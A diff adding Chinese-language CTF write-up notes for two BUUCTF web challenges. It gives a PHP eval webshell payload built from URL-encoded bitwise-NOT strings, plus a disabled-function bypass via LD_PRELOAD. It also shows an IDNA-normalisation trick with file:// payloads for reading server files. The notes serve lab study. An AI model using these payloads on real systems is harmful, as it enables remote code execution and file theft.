@@ -506,3 +506,59 @@ def getSign(action, param):
 
 接下来利用哈希拓展脚本--`hash_ext_attack.py`来预测签名
 
+
+
+# buuctf rce me
+
+url编码取反绕过
+
+期望命令:
+
+`assert(eval($_POSt[shell]))`
+
+分别生成assert和`eval($_POST[shell])`后拼接
+
+`?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);`
+
+post上传shell=phpinfo();看能不能执行命令
+
+发现禁用了很多函数,利用LD_PRELOAD原理绕过
+
+直接只用antsword的插件即可
+
+最后运行的命令/readflag得到flag
+
+
+
+# buuctf pythonginx
+
+- 配置文件存放目录：/etc/nginx
+- 主配置文件：/etc/nginx/conf/nginx.conf
+- 管理脚本：/usr/lib64/systemd/system/nginx.service
+- 模块：/usr/lisb64/nginx/modules
+- 应用程序：/usr/sbin/nginx
+- 程序默认存放位置：/usr/share/nginx/html
+- 日志默认存放位置：/var/log/nginx
+- 配置文件目录为：/usr/local/nginx/conf/nginx.conf
+
+知识点:
+
+idna与utf-8编码漏洞
+
+```
+℆这个字符,如果使用python3进行idna编码的话
+print('℆'.encode('idna'))
+结果
+b'c/u'
+如果再使用utf-8进行解码的话
+print(b'c/u'.decode('utf-8'))
+结果
+c/u
+通过这种方法可以绕过网站的一些过滤字符
+```
+
+payload:
+
+`/getUrl/?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf`
+
+`/getUrl?url=file://suctf.c℆sr/fffffflag`
